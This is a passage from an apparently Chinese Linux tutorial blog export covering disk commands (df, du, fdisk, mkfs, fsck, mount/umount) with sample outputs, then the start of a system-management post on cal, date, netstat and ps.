<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">df</span> [-ahikHTm] [目录或文件名]</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-a ：列出所有的文件系统，包括系统特有的 /proc 等文件系统；</p>
</li>
<li class="lvl-2">
<p>-k ：以 KBytes 的容量显示各文件系统；</p>
</li>
<li class="lvl-2">
<p>-m ：以 MBytes 的容量显示各文件系统；</p>
</li>
<li class="lvl-2">
<p>-h ：以人们较易阅读的 GBytes, MBytes, KBytes 等格式自行显示；</p>
</li>
<li class="lvl-2">
<p>-H ：以 M=1000K 取代 M=1024K 的进位方式；</p>
</li>
<li class="lvl-2">
<p>-T ：显示文件系统类型, 连同该 partition 的 filesystem 名称 (例如 ext3) 也列出；</p>
</li>
<li class="lvl-2">
<p>-i ：不用硬盘容量，而以 inode 的数量来显示</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">df</span> -Th</span><br><span class="line">Filesystem          Type      Size  Used Avail Use% Mounted on</span><br><span class="line">devtmpfs            devtmpfs  854M     0  854M   0% /dev</span><br><span class="line">tmpfs               tmpfs     874M     0  874M   0% /dev/shm</span><br><span class="line">tmpfs               tmpfs     874M  8.7M  865M   1% /run</span><br><span class="line">tmpfs               tmpfs     874M     0  874M   0% /sys/fs/cgroup</span><br><span class="line">/dev/mapper/rl-root xfs        70G  2.9G   68G   5% /</span><br><span class="line">/dev/sda1           xfs      1014M  199M  816M  20% /boot</span><br><span class="line">/dev/mapper/rl-home xfs       127G  939M  126G   1% /home</span><br><span class="line">tmpfs               tmpfs     175M     0  175M   0% /run/user/0</span><br></pre></td></tr></table></figure>
<p>将系统内的所有特殊文件格式及名称都列出来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">df</span> -aT</span><br><span class="line">Filesystem          Type       1K-blocks    Used Available Use% Mounted on</span><br><span class="line">sysfs               sysfs              0       0         0    - /sys</span><br><span class="line">proc                proc               0       0         0    - /proc</span><br><span class="line">devtmpfs            devtmpfs      874420       0    874420   0% /dev</span><br><span class="line">securityfs          securityfs         0       0         0    - /sys/kernel/security</span><br><span class="line">tmpfs               tmpfs         894176       0    894176   0% /dev/shm</span><br><span class="line">devpts              devpts             0       0         0    - /dev/pts</span><br><span class="line">tmpfs               tmpfs         894176    8896    885280   1% /run</span><br><span class="line">tmpfs               tmpfs         894176       0    894176   0% /sys/fs/cgroup</span><br><span class="line">cgroup              cgroup             0       0         0    - /sys/fs/cgroup/systemd</span><br><span class="line">pstore              pstore             0       0         0    - /sys/fs/pstore</span><br><span class="line">bpf                 bpf                0       0         0    - /sys/fs/bpf</span><br><span class="line">...................</span><br></pre></td></tr></table></figure>
<h4 id="du">du</h4>
<p>du命令是对文件和目录磁盘使用的空间的查看。du命令用于统计目录或文件所占磁盘空间的大小，该命令的执行结果与df类似，du更侧重于磁盘的使用状况。</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">du</span> [选项] 文件或目录名称</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-a ：列出所有的文件与目录容量，因为默认仅统计目录底下的文件量而已。</p>
</li>
<li class="lvl-2">
<p>-h ：以人们较易读的容量格式 (G/M) 显示；</p>
</li>
<li class="lvl-2">
<p>-s ：列出总量而已，而不列出每个各别的目录占用容量；</p>
</li>
<li class="lvl-2">
<p>-S ：不包括子目录下的总计，与 -s 有点差别。</p>
</li>
<li class="lvl-2">
<p>-k ：以 KBytes 列出容量显示；</p>
</li>
<li class="lvl-2">
<p>-m ：以 MBytes 列出容量显示；</p>
</li>
</ul>
<p>du直接加文件，可以打印文件的大小</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">du</span> 1.txt </span><br><span class="line">4	1.txt</span><br><span class="line">[root@rocky8:~]# <span class="built_in">du</span> -h 1.txt </span><br><span class="line">4.0K	1.txt</span><br></pre></td></tr></table></figure>
<p>du没有加任何选项时，只列出当前目录下的所有文件夹容量（包括隐藏文件夹）:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">du</span></span><br><span class="line">0	./test1     &lt;==每个目录都会列出来</span><br><span class="line">0	./test2</span><br><span class="line">0	./test3</span><br><span class="line">0	./.config/procps   &lt;==包括隐藏文件的目录</span><br><span class="line">0	./.config/htop</span><br><span class="line">0	./.config</span><br><span class="line">44	.           &lt;==这个目录(.)所占用的总量</span><br></pre></td></tr></table></figure>
<p>直接输入 du 没有加任何选项时，则 du 会分析当前所在目录的文件与目录所占用的硬盘空间。</p>
<p>加<code>-a</code>选项才显示文件的容量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">du</span> -a</span><br><span class="line">4	./.bash_logout</span><br><span class="line">4	./.bash_profile</span><br><span class="line">4	./.bashrc</span><br><span class="line">4	./.cshrc</span><br><span class="line">....中间省略....</span><br><span class="line">0	./.config/htop</span><br><span class="line">0	./.config</span><br><span class="line">44	.</span><br></pre></td></tr></table></figure>
<p>检查根目录底下每个目录所占用的容量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">du</span> -sh /*</span><br><span class="line">0	/bin</span><br><span class="line">159M	/boot</span><br><span class="line">0	/dev</span><br><span class="line">25M	/etc</span><br><span class="line">.....中间省略....</span><br><span class="line">0	/proc</span><br><span class="line">.....中间省略....</span><br><span class="line">8.0K	/tmp</span><br><span class="line">2.1G	/usr</span><br><span class="line">253M	/var</span><br></pre></td></tr></table></figure>
<h4 id="fdisk">fdisk</h4>
<p><strong>!!!   为保证我的Linux系统的正常使用，从磁盘分割和格式化及其以后的内容，暂未编写博客   !!!</strong></p>
<p>fdisk 是 Linux 的磁盘分区表操作工具。</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk [-l] 装置名称</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-l ：输出后面接的装置所有的分区内容。若仅有 fdisk -l 时， 则系统将会把整个系统内能够搜寻到的装置的分区均列出来。</p>
</li>
</ul>
<p>列出所有分区信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# fdisk -l</span><br><span class="line">Disk /dev/sda: 200 GiB, 214748364800 bytes, 419430400 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x9d182722</span><br><span class="line"></span><br><span class="line">Device     Boot   Start       End   Sectors  Size Id Type</span><br><span class="line">/dev/sda1  *       2048   2099199   2097152    1G 83 Linux</span><br><span class="line">/dev/sda2       2099200 419430399 417331200  199G 8e Linux LVM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/rl-root: 70 GiB, 75161927680 bytes, 146800640 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/rl-swap: 2 GiB, 2168455168 bytes, 4235264 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/mapper/rl-home: 127 GiB, 136340045824 bytes, 266289152 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br></pre></td></tr></table></figure>
<p>查看根目录所在磁盘，并查阅该硬盘内的相关信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">df</span> /            &lt;==注意：重点在找出磁盘文件名而已</span><br><span class="line">Filesystem          1K-blocks    Used Available Use% Mounted on</span><br><span class="line">/dev/mapper/rl-root  73364480 2995664  70368816   5% /</span><br><span class="line">[root@rocky8:~]# fdisk /dev/mapper/rl-root  &lt;==不要加上数字！</span><br><span class="line"></span><br><span class="line">Welcome to fdisk (util-linux 2.32.1).</span><br><span class="line">Changes will remain <span class="keyword">in</span> memory only, <span class="keyword">until</span> you decide to write them.</span><br><span class="line">Be careful before using the write <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">The old xfs signature will be removed by a write <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">Device does not contain a recognized partition table.</span><br><span class="line">Created a new DOS disklabel with disk identifier 0xbb210c3d.</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>):      &lt;==等待你的输入！</span><br></pre></td></tr></table></figure>
<p>输入 m 后，就会看到底下这些命令介绍</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> help): m</span><br><span class="line"></span><br><span class="line">Help:</span><br><span class="line"></span><br><span class="line">  DOS (MBR)</span><br><span class="line">   a   toggle a bootable flag</span><br><span class="line">   b   edit nested BSD disklabel</span><br><span class="line">   c   toggle the dos compatibility flag</span><br><span class="line"></span><br><span class="line">  Generic</span><br><span class="line">   d   <span class="keyword">delete</span> a <span class="keyword">partition</span>            <span class="operator">&lt;=</span><span class="operator">=</span>删除一个<span class="keyword">partition</span></span><br><span class="line">   F   list <span class="keyword">free</span> unpartitioned space</span><br><span class="line">   l   list known <span class="keyword">partition</span> types</span><br><span class="line">   n   <span class="keyword">add</span> a <span class="keyword">new</span> <span class="keyword">partition</span>           <span class="operator">&lt;=</span><span class="operator">=</span>新增一个<span class="keyword">partition</span></span><br><span class="line">   p   print the <span class="keyword">partition</span> <span class="keyword">table</span>     <span class="operator">&lt;=</span><span class="operator">=</span>在屏幕上显示分割表</span><br><span class="line">   t   change a <span class="keyword">partition</span> type</span><br><span class="line">   v   verify the <span class="keyword">partition</span> <span class="keyword">table</span></span><br><span class="line">   i   print information about a <span class="keyword">partition</span></span><br><span class="line"></span><br><span class="line">  Misc</span><br><span class="line">   m   print this menu</span><br><span class="line">   u   change display<span class="operator">/</span>entry units</span><br><span class="line">   x   extra functionality (experts <span class="keyword">only</span>)</span><br><span class="line"></span><br><span class="line">  Script</span><br><span class="line">   I   load disk layout <span class="keyword">from</span> sfdisk script file</span><br><span class="line">   O   dump disk layout <span class="keyword">to</span> sfdisk script file</span><br><span class="line"></span><br><span class="line">  Save <span class="operator">&amp;</span> Exit</span><br><span class="line">   w   write <span class="keyword">table</span> <span class="keyword">to</span> disk <span class="keyword">and</span> exit  <span class="operator">&lt;=</span><span class="operator">=</span>将刚刚的动作写入分割表</span><br><span class="line">   q   quit <span class="keyword">without</span> saving changes   <span class="operator">&lt;=</span><span class="operator">=</span>不储存离开fdisk程序</span><br><span class="line"></span><br><span class="line">  <span class="keyword">Create</span> a <span class="keyword">new</span> label</span><br><span class="line">   g   <span class="keyword">create</span> a <span class="keyword">new</span> <span class="keyword">empty</span> GPT <span class="keyword">partition</span> <span class="keyword">table</span></span><br><span class="line">   G   <span class="keyword">create</span> a <span class="keyword">new</span> <span class="keyword">empty</span> SGI (IRIX) <span class="keyword">partition</span> <span class="keyword">table</span></span><br><span class="line">   o   <span class="keyword">create</span> a <span class="keyword">new</span> <span class="keyword">empty</span> DOS <span class="keyword">partition</span> <span class="keyword">table</span></span><br><span class="line">   s   <span class="keyword">create</span> a <span class="keyword">new</span> <span class="keyword">empty</span> Sun <span class="keyword">partition</span> <span class="keyword">table</span></span><br></pre></td></tr></table></figure>
<p>离开 fdisk 时按下 <code>q</code>，那么所有的动作都不会生效！相反的， 按下<code>w</code>就是动作生效的意思。</p>
<p>这个是我的本地虚拟机：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): p  &lt;== 这里可以输出目前磁盘的状态</span><br><span class="line">Disk /dev/mapper/rl-root: 70 GiB, 75161927680 bytes, 146800640 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0xbb210c3d</span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): q</span><br></pre></td></tr></table></figure>
<p>这个是我的云服务器：</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">Command (m for help): p</span><br><span class="line"></span><br><span class="line">Disk /dev/vda:<span class="number"> 40 </span>GiB,<span class="number"> 42949672960 </span>bytes,<span class="number"> 83886080 </span>sectors</span><br><span class="line">Units: sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes</span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes</span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes</span><br><span class="line">Disklabel type: gpt</span><br><span class="line">Disk identifier: 8E31C5C4-D56B-4F46-A42F-54B90BC33E0C</span><br><span class="line"></span><br><span class="line">Device      Start      End  Sectors  Size Type</span><br><span class="line">/dev/vda1   <span class="number"> 2048 </span>   <span class="number"> 4095 </span>   <span class="number"> 2048 </span>   1M BIOS boot</span><br><span class="line">/dev/vda2   <span class="number"> 4096 </span> <span class="number"> 208895 </span> <span class="number"> 204800 </span> 100M EFI System</span><br><span class="line">/dev/vda3 <span class="number"> 208896 </span>83886046<span class="number"> 83677151 </span>39.9G Linux filesystem</span><br><span class="line">Command (m for help): q</span><br></pre></td></tr></table></figure>
<p>这个是本博客转载原文：</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">Command (m for help): p  &lt;== 这里可以输出目前磁盘的状态</span><br><span class="line"></span><br><span class="line">Disk /dev/hdc: 41.1 GB,<span class="number"> 41174138880 </span>bytes        &lt;==这个磁盘的文件名与容量</span><br><span class="line">255 heads,<span class="number"> 63 </span>sectors/track,<span class="number"> 5005 </span>cylinders      &lt;==磁头、扇区与磁柱大小</span><br><span class="line">Units = cylinders of<span class="number"> 16065 </span>*<span class="number"> 512 </span>=<span class="number"> 8225280 </span>bytes &lt;==每个磁柱的大小</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/hdc1   *          <span class="number"> 1 </span>        <span class="number"> 13 </span>    <span class="number"> 104391 </span> <span class="number"> 83 </span> Linux</span><br><span class="line">/dev/hdc2             <span class="number"> 14 </span>      <span class="number"> 1288 </span>   10241437+ <span class="number"> 83 </span> Linux</span><br><span class="line">/dev/hdc3           <span class="number"> 1289 </span>      <span class="number"> 1925 </span>    5116702+ <span class="number"> 83 </span> Linux</span><br><span class="line">/dev/hdc4           <span class="number"> 1926 </span>      <span class="number"> 5005 </span>  <span class="number"> 24740100 </span>  <span class="number"> 5 </span> Extended</span><br><span class="line">/dev/hdc5           <span class="number"> 1926 </span>      <span class="number"> 2052 </span>   <span class="number"> 1020096 </span> <span class="number"> 82 </span> Linux swap / Solaris</span><br><span class="line"><span class="comment"># 装置文件名 启动区否 开始磁柱    结束磁柱  1K大小容量 磁盘分区槽内的系统</span></span><br><span class="line"></span><br><span class="line">Command (m for help): q</span><br></pre></td></tr></table></figure>
<p>使用 <code>p</code> 可以列出目前这颗磁盘的分割表信息，这个信息的上半部在显示整体磁盘的状态。</p>
<h4 id="磁盘格式化">磁盘格式化</h4>
<p>磁盘分割完毕后自然就是要进行文件系统的格式化，格式化的命令非常的简单，使用 <code>mkfs</code>（make filesystem） 命令。</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs [-t 文件系统格式] 装置文件名</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-t ：可以接文件系统格式，例如 ext3, ext2, vfat 等(系统有支持才会生效)</p>
</li>
</ul>
<p>查看 mkfs 支持的文件格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM_0_9_centos web]# mkfs[tab]</span><br><span class="line">mkfs         mkfs.cramfs  mkfs.ext3    mkfs.minix   </span><br><span class="line">mkfs.btrfs   mkfs.ext2    mkfs.ext4    mkfs.xfs</span><br></pre></td></tr></table></figure>
<p>按下两个[tab]，会发现 mkfs 支持的文件格式如上所示。</p>
<p>将分区 /dev/hdc6（可指定其他分区） 格式化为ext3文件系统：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[root@www ~]# mkfs -t ext3 /dev/hdc6</span><br><span class="line">mke2fs 1.39 (29-May-2006)</span><br><span class="line">Filesystem label=                &lt;==这里指的是分割槽的名称(label)</span><br><span class="line">OS type: Linux</span><br><span class="line">Block <span class="attribute">size</span>=4096 (<span class="attribute">log</span>=2)          &lt;==block 的大小配置为 4K </span><br><span class="line">Fragment <span class="attribute">size</span>=4096 (<span class="attribute">log</span>=2)</span><br><span class="line">251392 inodes, 502023 blocks     &lt;==由此配置决定的inode/block数量</span><br><span class="line">25101 blocks (5.00%) reserved <span class="keyword">for</span> the super<span class="built_in"> user</span></span><br><span class="line"><span class="built_in"></span>First data <span class="attribute">block</span>=0</span><br><span class="line">Maximum filesystem <span class="attribute">blocks</span>=515899392</span><br><span class="line">16 block groups</span><br><span class="line">32768 blocks per group, 32768 fragments per<span class="built_in"> group</span></span><br><span class="line"><span class="built_in"></span>15712 inodes per<span class="built_in"> group</span></span><br><span class="line"><span class="built_in"></span>Superblock backups stored on blocks:</span><br><span class="line">        32768, 98304, 163840, 229376, 294912</span><br><span class="line"></span><br><span class="line">Writing inode tables: done</span><br><span class="line">Creating journal (8192 blocks): done &lt;==有日志记录</span><br><span class="line">Writing superblocks <span class="keyword">and</span> filesystem<span class="built_in"> accounting </span>information: done</span><br><span class="line"></span><br><span class="line">This filesystem will be automatically checked every 34 mounts <span class="keyword">or</span></span><br><span class="line">180 days, whichever comes first.  Use tune2fs -c <span class="keyword">or</span> -i <span class="keyword">to</span> override.</span><br><span class="line"><span class="comment"># 这样就创建起来我们所需要的 Ext3 文件系统了！简单明了！</span></span><br><span class="line">1234567891011121314151617181920212223</span><br></pre></td></tr></table></figure>
<h4 id="磁盘检验">磁盘检验</h4>
<p>fsck（file system check）用来检查和维护不一致的文件系统。</p>
<p>若系统掉电或磁盘发生问题，可利用fsck命令对文件系统进行检查。</p>
<p>语法：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">fsck <span class="selector-attr">[-t 文件系统]</span> <span class="selector-attr">[-ACay]</span> 装置名称</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-t : 给定档案系统的型式，若在 /etc/fstab 中已有定义或 kernel 本身已支援的则不需加上此参数</p>
</li>
<li class="lvl-2">
<p>-s : 依序一个一个地执行 fsck 的指令来检查</p>
</li>
<li class="lvl-2">
<p>-A : 对/etc/fstab 中所有列出来的 分区（partition）做检查</p>
</li>
<li class="lvl-2">
<p>-C : 显示完整的检查进度</p>
</li>
<li class="lvl-2">
<p>-d : 打印出 e2fsck 的 debug 结果</p>
</li>
<li class="lvl-2">
<p>-p : 同时有 -A 条件时，同时有多个 fsck 的检查一起执行</p>
</li>
<li class="lvl-2">
<p>-R : 同时有 -A 条件时，省略 / 不检查</p>
</li>
<li class="lvl-2">
<p>-V : 详细显示模式</p>
</li>
<li class="lvl-2">
<p>-a : 如果检查有错则自动修复</p>
</li>
<li class="lvl-2">
<p>-r : 如果检查有错则由使用者回答是否修复</p>
</li>
<li class="lvl-2">
<p>-y : 选项指定检测每个文件是自动输入yes，在不确定那些是不正常的时候，可以执行 # fsck -y 全部检查修复。</p>
</li>
</ul>
<p>查看系统有多少文件系统支持的 fsck 命令：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[root@www ~]</span># fsck<span class="selector-attr">[tab]</span><span class="selector-attr">[tab]</span></span><br><span class="line">fsck         fsck<span class="selector-class">.cramfs</span>  fsck<span class="selector-class">.ext2</span>    fsck<span class="selector-class">.ext3</span>    fsck<span class="selector-class">.msdos</span>   fsck<span class="selector-class">.vfat</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>强制检测 /dev/hdc6 分区:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line">[<span class="string">root@www</span> <span class="string">~</span>]<span class="comment"># fsck -C -f -t ext3 /dev/hdc6 </span></span><br><span class="line"><span class="string">fsck</span> <span class="number">1.39</span> <span class="string">(29-May-2006)</span></span><br><span class="line"><span class="string">e2fsck</span> <span class="number">1.39</span> <span class="string">(29-May-2006)</span></span><br><span class="line"><span class="attr">Pass 1:</span> <span class="string">Checking</span> <span class="string">inodes,</span> <span class="string">blocks,</span> <span class="string">and</span> <span class="string">sizes</span></span><br><span class="line"><span class="attr">Pass 2:</span> <span class="string">Checking</span> <span class="string">directory</span> <span class="string">structure</span></span><br><span class="line"><span class="attr">Pass 3:</span> <span class="string">Checking</span> <span class="string">directory</span> <span class="string">connectivity</span></span><br><span class="line"><span class="attr">Pass 4:</span> <span class="string">Checking</span> <span class="string">reference</span> <span class="string">counts</span></span><br><span class="line"><span class="attr">Pass 5:</span> <span class="string">Checking</span> <span class="string">group</span> <span class="string">summary</span> <span class="string">information</span></span><br><span class="line"><span class="attr">vbird_logical:</span> <span class="number">11</span><span class="string">/251968</span> <span class="string">files</span> <span class="string">(9.1%</span> <span class="string">non-contiguous),</span> <span class="number">36926</span><span class="string">/1004046</span> <span class="string">blocks</span></span><br><span class="line"><span class="number">123456789</span></span><br></pre></td></tr></table></figure>
<p>如果没有加上 -f 的选项，则由于这个文件系统不曾出现问题，检查的经过非常快速！若加上 -f 强制检查，才会一项一项的显示过程。</p>
<h4 id="磁盘挂载与卸除">磁盘挂载与卸除</h4>
<p>Linux 的磁盘挂载使用 <code>mount</code> 命令，卸载使用 <code>umount</code> 命令。</p>
<p>磁盘挂载语法：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">mount <span class="selector-attr">[-t 文件系统]</span> <span class="selector-attr">[-L Label名]</span> <span class="selector-attr">[-o 额外选项]</span> <span class="selector-attr">[-n]</span>  装置文件名  挂载点</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>用默认的方式，将刚刚创建的 /dev/hdc6 挂载到 /mnt/hdc6 上面！</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@www</span> ~]<span class="comment"># mkdir /mnt/hdc6</span></span><br><span class="line">[root<span class="variable">@www</span> ~]<span class="comment"># mount /dev/hdc6 /mnt/hdc6</span></span><br><span class="line">[root<span class="variable">@www</span> ~]<span class="comment"># df</span></span><br><span class="line">Filesystem           <span class="number">1</span>K-blocks      Used Available Use% Mounted on</span><br><span class="line">.....中间省略.....</span><br><span class="line"><span class="regexp">/dev/hdc</span>6              <span class="number">1976312</span>     <span class="number">42072</span>   <span class="number">1833836</span>   <span class="number">3</span>% <span class="regexp">/mnt/hdc</span>6</span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>磁盘卸载命令 <code>umount</code> 语法：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">umount</span> [-<span class="meta">fn</span>] 装置文件名或挂载点</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-f ：强制卸除！可用在类似网络文件系统 (NFS) 无法读取到的情况下；</p>
</li>
<li class="lvl-2">
<p>-n ：不升级 /etc/mtab 情况下卸除。</p>
</li>
</ul>
<p>卸载/dev/hdc6</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@www</span> ~]<span class="meta"># umount /dev/hdc6     </span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>本文参考：</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】系统管理</title>
    <url>/posts/dd673edb/</url>
    <content><![CDATA[<h2 id="查看当前日历：cal">查看当前日历：cal</h2>
<p>cal命令用于查看当前日历，-y显示整年日历：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~$ cal</span><br><span class="line">      十一月 2019        </span><br><span class="line">日 一 二 三 四 五 六  </span><br><span class="line">                1  2  </span><br><span class="line"> 3  4  5  6  7  8  9  </span><br><span class="line">10 11 12 13 14 15 16  </span><br><span class="line">17 18 19 20 21 22 23  </span><br><span class="line">24 25 26 27 28 29 30 </span><br></pre></td></tr></table></figure>
<h2 id="显示或设置时间：date">显示或设置时间：date</h2>
<p>设置时间格式（需要管理员权限）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">date</span> [MMDDhhmm[[CC]YY][.ss]] +format</span><br></pre></td></tr></table></figure>
<p>MM为月，DD为天，hh为小时，mm为分钟；CC为年前两位，YY为年的后两位，ss为秒。</p>
<p>如： date 010203042016.55。</p>
<p>显示时间格式（date ‘+%y,%m,%d,%H,%M,%S’）：</p>
<table>
<thead>
<tr>
<th>format格式</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>%Y，%y</td>
<td>年</td>
</tr>
<tr>
<td>%m</td>
<td>月</td>
</tr>
<tr>
<td>%d</td>
<td>日</td>
</tr>
<tr>
<td>%H</td>
<td>时</td>
</tr>
<tr>
<td>%M</td>
<td>分</td>
</tr>
<tr>
<td>%S</td>
<td>秒</td>
</tr>
</tbody>
</table>
<h2 id="查看网络状态：netstat">查看网络状态：netstat</h2>
<p>netstat命令用于显示网络状态。</p>
<p>利用netstat指令可让你得知整个Linux系统的网络情况。</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat [-acCeFghilMnNoprstuvVwx][-A&lt;网络类型&gt;][--ip]</span><br></pre></td></tr></table></figure>
<p><strong>参数说明</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-a或–all 显示所有连线中的Socket。</p>
</li>
<li class="lvl-2">
<p>-A&lt;网络类型&gt;或–&lt;网络类型&gt; 列出该网络类型连线中的相关地址。</p>
</li>
<li class="lvl-2">
<p>-c或–continuous 持续列出网络状态。</p>
</li>
<li class="lvl-2">
<p>-C或–cache 显示路由器配置的快取信息。</p>
</li>
<li class="lvl-2">
<p>-e或–extend 显示网络其他相关信息。</p>
</li>
<li class="lvl-2">
<p>-F或–fib 显示FIB。</p>
</li>
<li class="lvl-2">
<p>-g或–groups 显示多重广播功能群组组员名单。</p>
</li>
<li class="lvl-2">
<p>-h或–help 在线帮助。</p>
</li>
<li class="lvl-2">
<p>-i或–interfaces 显示网络界面信息表单。</p>
</li>
<li class="lvl-2">
<p>-l或–listening 显示监控中的服务器的Socket。</p>
</li>
<li class="lvl-2">
<p>-M或–masquerade 显示伪装的网络连线。</p>
</li>
<li class="lvl-2">
<p>-n或–numeric 直接使用IP地址，而不通过域名服务器。</p>
</li>
<li class="lvl-2">
<p>-N或–netlink或–symbolic 显示网络硬件外围设备的符号连接名称。</p>
</li>
<li class="lvl-2">
<p>-o或–timers 显示计时器。</p>
</li>
<li class="lvl-2">
<p>-p或–programs 显示正在使用Socket的程序识别码和程序名称。</p>
</li>
<li class="lvl-2">
<p>-r或–route 显示Routing Table。</p>
</li>
<li class="lvl-2">
<p>-s或–statistice 显示网络工作信息统计表。</p>
</li>
<li class="lvl-2">
<p>-t或–tcp 显示TCP传输协议的连线状况。</p>
</li>
<li class="lvl-2">
<p>-u或–udp 显示UDP传输协议的连线状况。</p>
</li>
<li class="lvl-2">
<p>-v或–verbose 显示指令执行过程。</p>
</li>
<li class="lvl-2">
<p>-V或–version 显示版本信息。</p>
</li>
<li class="lvl-2">
<p>-w或–raw 显示RAW传输协议的连线状况。</p>
</li>
<li class="lvl-2">
<p>-x或–unix 此参数的效果和指定&quot;-A unix&quot;参数相同。</p>
</li>
<li class="lvl-2">
<p>–ip或–inet 此参数的效果和指定&quot;-A inet&quot;参数相同。</p>
</li>
</ul>
<p>常用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# netstat -nltp</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      829/sshd            </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      829/sshd</span><br></pre></td></tr></table></figure>
<h2 id="查看进程信息：ps">查看进程信息：ps</h2>
<p>进程是一个具有一定独立功能的程序，它是操作系统动态执行的基本单元。</p>
<p><strong>ps命令选项：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ps a 显示现行终端机下的所有程序，包括其他用户的程序。</p>
